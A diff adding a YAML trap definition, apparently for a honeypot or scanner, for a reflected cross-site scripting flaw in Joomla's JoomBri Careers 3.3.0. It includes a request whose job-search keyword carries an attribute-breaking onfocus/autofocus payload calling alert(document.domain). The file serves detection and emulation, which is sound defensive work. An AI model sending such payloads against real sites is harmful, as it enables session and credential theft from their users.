@@ -1,0 +1,28 @@
+id: joomla-joombri-careers-xss
+info:
+  name: Joomla JoomBri Careers 3.3.0 - Cross-Site Scripting
+  author: r3Y3r53
+  description: 'The attacker can send to victim a link containing a malicious URL
+    in an email or instant message can perform a wide variety of actions, such as
+    stealing the victim''s session token or login credentials.
+
+    '
+  severity: medium
+  reference:
+  - https://packetstormsecurity.com/files/168641/Joomla-JoomBri-Careers-3.3.0-Cross-Site-Scripting.html
+  - https://cxsecurity.com/issue/WLB-2022100024
+  - https://extensions.joomla.org/
+  metadata:
+    verified: true
+    max-request: 1
+  tags: packetstorm,xss,joomla,joombri
+traps:
+- request:
+    method: GET
+    path: /for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: alert(document.domain)Joomla
